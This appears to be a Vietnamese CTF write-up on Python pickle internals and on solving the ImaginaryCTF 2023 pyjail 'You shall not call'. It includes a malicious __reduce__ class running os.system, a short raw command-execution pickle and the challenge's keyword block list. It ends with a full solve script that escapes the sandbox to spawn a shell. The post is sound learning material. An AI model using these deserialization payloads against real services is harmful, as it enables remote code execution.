---
title: "The journy deep down to the pickle machine"
description: "The journy deep down to the pickle machine"
summary: "The journy deep down to the pickle machine"
categories: ["Writeup"]
tags: ["Misc"]
#externalUrl: ""
date: 2023-04-27
draft: false
authors:
  - Shin24
---

Vừa rồi trong giải Imaginary CTF 2023, mình đã tham gia cùng team nhưng không đóng góp được nhiều, do các bài web đầu khá dễ nên hầu như ai cũng làm được, dẫn đến điểm giảm còn 100, bài `amongus` thì dù mình đã tìm ra hướng đúng nhưng xử lý sót nên payload đã không hoạt động, sau khi đọc writeup và nhận ra sai lầm thì mình đã khá cay :))) 

Ngoài ra mình có attemp 1 (hoặc có thể là 2) challenge nữa là `You shall not call`, đây là một bài pyjail khá hay và khó, sau khi nghía qua script giải thì mình nhận ra được hướng của bài và bắt đầu ngồi tự giải lại. Sau đây mình sẽ nói về pickle và writeup lại quá trình giải bài này

## Python Pickle
### Introduction
Như ta đã biết thì để truyền các dữ liệu phức tạp như object hay array thì ta sẽ phải serialize nó sang một dạng có thể truyền tải và lưu trữ được. Nếu cảm thấy khó hiểu thì thật ra JSON cũng là một dạng của serialization, trong JS thì `JSON.stringify` là serialize và `JSON.parse` là deserialize ( quá trình ngược lại của serialize)

Trong python thì pickle chính là thư viện native của python phục vụ việc serialize các kiểu dữ liệu như object hay array
### Pickle structure
Pickle sử dụng một Pickle Machine để serialize/deserialize data, bao gồm 3 phần là parser, stack và memo:
- Parser là phần sẽ xử lý các opcodes và call tới dispatcher ứng với opcode đó
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/abb60cf2-cec1-47e6-a361-1a4e44ee7e33)


- Stack thì như cái tên của nó, đóng vai trò là bộ nhớ ngắn hạn
- Memo đóng vai trò là một bộ nhớ dài hạn hơn, được implement bằng một python dict 
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c2c04ea1-d63c-4d6c-b877-a2e73e1a61e0)


Tại source code của [python](https://github.com/python/cpython/blob/26e08dfdd7ac1b3d567d30cd35e4898121580390/Lib/pickle.py#L4) ta có thể thấy các opcodes được khai báo ở phía trên 
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/572ebb23-46cd-4744-a29f-93e0577874ba)


Các opcodes này cho phép ta thao tác với nhiều kiểu dữ liệu khác nhau như list, tuple, dict, objects, strings, int, ... thao tác với stack và memo. Ngoài ra nó còn cho phép ta import các modules, ghi thuộc tính vào các object

### What could go wrong
Nếu bạn là một web player thì hẳn đã gặp qua pickle khi tìm hiểu insecure deserialization, nhưng liệu bạn đã hiểu về quá trình deserialization của pickle chưa? Cùng nhìn vào một ví dụ

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7b6e7019-0d3f-45cd-ae81-c4c065b0b9c0)


`__reduce__` là một magic method trong python, nó được dùng để nói cho python biết các để reconstruct object đó, cần một ví dụ khác :

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/02ce6aae-c536-45d6-8c5b-70239dcaf39a)


`copy` cũng sử dụng magic method này để biết các reconstruct lại object.

Quay lại vấn đề, nếu bạn thử in kết quả từ `pickle.dumps` ta sẽ có một bytestream khá khó hiểu

```
\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.
```

Ta sẽ dùng một thư viện có sẵn khác để hỗ trợ việc đọc hiểu bytestream này, đó là `pickletools`:

```py 
import pickle, os, pickletools

class Evil(object):
    def __reduce__(self):
        return (os.system,("id",))

e = Evil()
pickletools.dis(pickle.dumps(e))
```

```
    0: \x80 PROTO      4
    2: \x95 FRAME      29
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'id'
   34: \x94 MEMOIZE    (as 3)
   35: \x85 TUPLE1
   36: \x94 MEMOIZE    (as 4)
   37: R    REDUCE
   38: \x94 MEMOIZE    (as 5)
   39: .    STOP
highest protocol among opcodes = 4
```


Opcode đầu tiên là `PROTO` được đánh dấu bằng ký tự `\x80`, đây là opcode dùng để khai báo version được sử dụng của pickle protocol, cao nhất là 5, version càng cao thì các opcode mà nó hỗ trợ càng nhiều. Opcode `MEMOIZE` dùng để đưa value ở top của stack vào memo (không có gì đặc biệt nên từ giờ ta sẽ bỏ qua nó), SHORT_BINUNICODE thì đơn giản là dùng để khai báo một unicode string và đưa giá trị vào stack

`STACK_GLOBAL` là opcode đặc biệt, dùng để load một attribute bất kì từ 1 module và đưa vào top stack, với tên module cũng như tên attribute được lấy từ stack, trong trường hợp này tương đương với `from posix import system`

Tiếp theo ta thấy nó chứa chuỗi `id` vào top stack, sau đó dùng opcode `TUPLE1` để tạo 1 tuple 1 phần tử, cuối cùng là opcode `REDUCE`, dùng để gọi một callable object (function) với arguments là tuple ở đỉnh stack, giờ thì ta biết lý do tại sao payload lại là `(os.system,("id",))` rùi, arguments của callable bắt buộc phải là 1 tuple

Một điều hay nữa là ta có để rút gọn payload ở trên đi rất nhiều: `cos\nsystem\nS'ls'\n\x85R.`
![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/76024c6c-0740-4767-b9ac-ed2656a4cabb)

Thay vì dùng `STACK_GLOBAL` thì ta có thể dùng opcode GLOBAL để load trực tiếp attribute mà không cần thông qua stack, sau đó push `id` vào stack bằng opcode `STRING` (khai báo 1 string) rồi dùng REDUCE để gọi `posix.system('id')`, opcode `.` (`STOP`) luôn nằm ở cuối để kết thúc quá trình deserialization

Cách mà mình tìm hiểu pickle là bằng việc đọc source code của nó, source code khá dễ đọc nên bạn có thể truy cập vào link source mình để khi nãy và tìm hiểu thêm về nó nhé

## The challenge
```py 
import __main__
import pickle
import io

# Security measure -- forbid calls
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']: #pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:
    id = getattr(pickle, op.upper())[0]
    delattr(pickle._Unpickler, pickle._Unpickler.dispatch[id].__name__)
    pickle._Unpickler.dispatch[id] = lambda _: print("Stop right there, you heineous criminal!") or exit()

# Security measure -- remove dangerous class and method
del pickle.Unpickler
del pickle._Unpickler.find_class

# Security measure -- overload unpickler with an actually secure class
class SecureUnpickler(pickle._Unpickler):
    def find_class(self, _: str, name: str) -> object:
        # Security measure -- prevent access to dangerous elements
        for x in ['exe', 'os', 'break', 'set', 'eva', 'help', 'sys', 'load', 'open', 'dis']:
            if x in name:
                print("Smuggling contraband in broad daylight?! Guards!")
                break
        # Security measure -- only the main module is a valid lookup target
        else:
            return getattr(__main__, name)

# Security measure -- remove dangerous magic
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]

# Security measure -- remove dangerous magic
__builtins__ = { k: getattr(__builtins__, k) for k in dir(__builtins__) if '_' not in k }

# My jail is very secure!
data = io.BytesIO(bytes.fromhex(input('$ ')))
SecureUnpickler(data).load()
```
Yêu cầu đơn giản là đọc file flag ở trên server

### Analyzing

Đầu tiên ta thấy một số opcodes bị ghi đè

```py
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']: #pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:
    id = getattr(pickle, op.upper())[0]
    delattr(pickle._Unpickler, pickle._Unpickler.dispatch[id].__name__)
    pickle._Unpickler.dispatch[id] = lambda _: print("Stop right there, you heineous criminal!") or exit()
```

Ta sẽ không thể gọi các opcodes này nữa, các opcodes này đều là các opcodes quan trọng trong việc call function, như ở description ta cũng có thể thấy, các function calling opcodes sẽ bị chặn

tiếp theo là xóa class `Unpickler` và method `_Unpickler.find_class`

```py
del pickle.Unpickler
del pickle._Unpickler.find_class
```

Tạo class `SecureUnpickler` kế thừa `pickle._Unpickler` và ghi đè method `find_class` nhằm chặn việc load một số attribute bằng opcode `GLOBAL`, `find_class` là method được gọi để tìm attribute trong modules mà `GLOBAL` và `STACK_GLOBAL` gọi, nghĩa là mỗi khi muốn load một attribute nào đó (như `os.system`) thì đều phải đi qua filter này

```py
for x in ['exe', 'os', 'break', 'set', 'eva', 'help', 'sys', 'load', 'open', 'dis']:
            if x in name:
                print("Smuggling contraband in broad daylight?! Guards!")
                break
```

Tiếp theo là xóa các attribute có `_` trong tên ngoại trừ `__main__` và `__builtins__`

```py 
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]
```

module `__builtins__` chứa các builtin function cũng bị ghi đè và chỉ chừa lại các attribute không có `_` trong tên

```py
__builtins__ = { k: getattr(__builtins__, k) for k in dir(__builtins__) if '_' not in k }
```

Data nhận vào ở dạng hex và được unpickle (deserialize)

```py
data = io.BytesIO(bytes.fromhex(input('$ ')))
SecureUnpickler(data).load()
```

### Let's the game begin

Vấn đề đầu tiên ta gặp phải là việc có 5 opcode quan trọng bị xóa, dẫn đến việc ta không thể call function được. Vào [source code](https://github.com/python/cpython/blob/26e08dfdd7ac1b3d567d30cd35e4898121580390/Lib/pickle.py#L4) tìm đến class `_Unpickler` để tìm opcode thay thế

Sau một hồi đọc có thể thầy là không còn opcode nào khác có thể call được function, tuy nhiên tại dispatcher của opcode `BUILD` ta thấy một dòng đoạn code khá thú vị

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8b792d40-e59b-4f86-8879-6d8d0174e6ce)

Tại đây sẽ check xem nếu object có method `__setstate__` thì sẽ call đến method này với tham số là state, điều quan trọng là ta đều có thể kiểm soát được cả 2 data này, nhưng state thì dễ hiểu nhưng làm sao để kiểm soát`__setstate__`?

Nếu nhìn xuống phần code bên dưới nữa ta sẽ thấy opcode này có thể được dùng để gán các thuộc tính tùy ý cho object

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ed4c9e89-53bf-40ac-821c-646e1300880f)

Vậy ý tưởng là tìm cách ghi `__setstate__` thành một method bất kì muốn gọi tới (tất nhiên là method đó chỉ có thể có 1 arg). Giờ thì ta cần tìm một method, nếu để ý kỹ thì hàm `find_class` của challenge chỉ có phép ta lấy attribute từ `__main__`, mà các hàm builtins thì nằm trong `__builtins__`, vậy làm sao để lấy được các attribute này đây?

Sau vài lần thử mình phát hiện ra `__main__` có 1 attribute khác là `__main__` trỏ đến chính nó, vậy sẽ ra sao nếu ta thử dùng dùng `GLOBAL` để lấy `__main__` và `__builtins__`, sau đó dùng opcode `BUILD` để ghi đè `__main__` thành chính `__builtins__`? Cùng thử nhé, thay vì craft payload bằng tay (như trước nay mình vẫn làm @@) thì nay mình biết được pwntools có hỗ trợ gen opcodes cho pickle

Đầu tiên là load `__builtins__` rồi lưu vào memo, sau đó load `__main__` rồi tạo một tuple 2 phần tử (mục đích là để `__builtins__ ` được set thông qua `setattr`, nó sẽ an toàn hơn là set trực tiếp, các bạn đọc source code dispatcher của BUILD nha)

Đưa payload cho server và print `__main__`ra để debug, thử `print(__main__.items())` ta sẽ thấy các builtin functions

**fact nhỏ**:

> Khi bạn dùng `dir(__builtins__)` và `__builtins__.__dir__()` thì kết quả sẽ khác nhau, vì nếu `__builtins__` là list thì `dir()` sẽ trả về các **phần tử của list** đó, còn khi gọi `__builtins__.__dir__()` thì là đang gọi đến chính method `__dir__` của class List (`__builtins__` là list chứa các builtin methods) nên nó sẽ trả về các thuộc tính/methods của object List


Bây giờ ta đã ghi đè `__main__` và mang các builtin methods ra nơi có thể "với" tới, tiếp theo ta sẽ thử ghi đè hàm `print` vào `__setstate__`. Lưu ý là vì ban đầu lúc push `__main__` thì ta chưa pop ra nên tại dòng số 26 khi build thì object được dùng sẽ là chính `__main__`, opcode `BUILD` ở dòng 26 là để trigger payload sau khi đã ghi đè `__setstate__`, `called` chính là `state`. Lúc này ta đã gọi được `print("called")`, nhưng ta không thể gọi `eval` hay `exec` gì được vì đã filter tại `find_class`

### Overwrite the world

Nếu ta có thể overwrite được `__setstate__`, vậy liệu ta có thể overwrite được `find_class` của `SecureUnpickler` không? Nếu vậy ta sẽ overwrite nó bằng cái gì? Đó chính là method `get` của `__builtins__`. Method này sẽ cho phép ta lấy attribute từ 1 dict, mỗi khi `GLOBAL` dispatcher trong `_Unpickler` được gọi thì nó sẽ dùng method này để tìm đến `attribute` trong modules tương ứng và đưa vào stack

Oke vậy tất cả mảnh ghép đã có đủ, flow cuối cùng sẽ như sau:
- Lấy method `get` của `__builtins__` để ghi đè `find_class` của `SecureUnpickler`
- Ghi đè `__setattr__` của `__main__` thành `eval`
- Trigger `__setstate__` với `state` là code python để chạy eval

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/faf14e7b-92dd-4b89-bb64-ef64c9d8d514)

Phần này mình không giải thích kỹ để các bạn có thể tự giải và hiểu hơn về pickle

Đây là script giải để các bạn tham khảo
```py 
from pwn import *
import pickletools


data = pickle.PROTO + bytes([5])

data += pickle.GLOBAL + b"__main__\n__main__\n"
data += pickle.BINPUT + bytes([1]) # save __main__ to memo[1]
data += pickle.POP

data += pickle.GLOBAL + b"__main__\nSecureUnpickler\n" 
data += pickle.BINPUT + bytes([2]) # save SecureUnpickler to memo[2]
data += pickle.POP

data += pickle.GLOBAL + b"__main__\n__main__\n"

data += pickle.MARK
data += pickle.STRING + b"'__main__'\n"
data += pickle.GLOBAL + b"__main__\n__builtins__\n"
data += pickle.DICT
data += pickle.BUILD

data += pickle.GLOBAL + b"__main__\nget\n"
data += pickle.BINPUT + bytes([3]) # save get to memo[3]
data += pickle.POP

# SecureUnpickler.find_class = __builtins__.get
data += pickle.BINGET + bytes([2])
data += pickle.NONE
data += pickle.MARK
data += pickle.STRING + b"'find_class'\n"
data += pickle.BINGET + bytes([3])
data += pickle.DICT
data += pickle.TUPLE2
data += pickle.BUILD 

# __main__.__setstate__ = __builtins__.eval
data += pickle.BINGET + bytes([1])
data += pickle.NONE
data += pickle.MARK
data += pickle.STRING + b"'__setstate__'\n"
data += pickle.GLOBAL + b"eval\naaa\n"
data += pickle.DICT
data += pickle.TUPLE2
data += pickle.BUILD 
data += pickle.POP
data += pickle.POP

# trigger eval("'__import__(\"os\").system(\"sh\")'\n")
data += pickle.BINGET + bytes([1])
data += pickle.STRING + b"'__import__(\"os\").system(\"sh\")'\n"
data += pickle.BUILD
data += pickle.POP

data += pickle.STOP

from codecs import getencoder
pickletools.dis(data)
print(getencoder("hex")(data)[0].decode())

```
